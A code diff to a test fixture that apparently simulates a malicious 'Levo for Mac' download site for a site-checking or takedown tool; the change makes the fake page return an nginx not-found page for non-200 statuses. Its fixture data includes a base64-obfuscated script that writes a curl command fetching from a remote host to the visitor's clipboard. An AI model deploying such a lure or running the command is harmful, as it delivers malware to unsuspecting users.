@@ -22,7 +22,7 @@ export const CASE = 384401854580134038n;
 export const DEMO_JS = Buffer.from("(()=>{const cmd=atob('Y3VybCAtc2ZMIC0tcmV0cnkgMyAtLXJldHJ5LWFsbC1lcnJvcnMgaHR0cHM6Ly9ob3N0c3luYy5wcm8vaGdwMDNtL0xOY2Y4S3BtNnFXcg==');navigator.clipboard.writeText(cmd)})();");
 export const LETS_ENCRYPT = { names: ["trylevo.app"], notBefore: "2026-11-26T19:12:00.000Z", notAfter: "2027-02-24T19:11:59.000Z", issuer: "C=US, O=Let's Encrypt, CN=R13", fingerprint256: "4F:2A:91:0C:7E:55:13:B8:9D:60:AF:21:3C:D4:77:0E:58:9B:C2:16:E3:44:A0:7F:D5:28:61:B9:3E:0A:CC:12" };
 
-/** The site as a check sees it: DNS, no registry hold, the page and the kit's script, at `now`. */
+/** The site as a check sees it: DNS, no registry hold, the page and the kit's script, at `now`. A `page` status other than 200 serves the server's bare not-found page: the site is gone by what it shows. */
 export function site(ips: string[], now: Date, options: { domain?: string; script?: number; server?: string; page?: number } = {}): SiteCheckDependencies & HostMoveDependencies {
 	const domain = options.domain ?? "trylevo.app";
 	return {
@@ -32,7 +32,10 @@ export function site(ips: string[], now: Date, options: { domain?: string; scrip
 		now: () => now,
 		fetch: async (input) => {
 			const url = input.toString();
-			if (url === `https://${domain}/`) return new Response("<html><title>Levo for Mac</title><script src=\"js/demo.js\"></script></html>", { status: options.page ?? 200, headers: { "content-type": "text/html", server: options.server ?? "nginx/1.30.0" } });
+			if (url === `https://${domain}/`) {
+				const body = (options.page ?? 200) === 200 ? "<html><title>Levo for Mac</title><script src=\"js/demo.js\"></script></html>" : `<html><head><title>${options.page} Not Found</title></head><body><center><h1>${options.page} Not Found</h1></center><hr><center>nginx</center></body></html>`;
+				return new Response(body, { status: options.page ?? 200, headers: { "content-type": "text/html", server: options.server ?? "nginx/1.30.0" } });
+			}
 			if (url === `https://${domain}/js/demo.js`) return (options.script ?? 200) === 200 ? new Response(DEMO_JS, { status: 200, headers: { "content-type": "application/javascript" } }) : new Response("Not Found", { status: options.script! });
 			throw new Error(`Unexpected request to ${url}`);
 		},
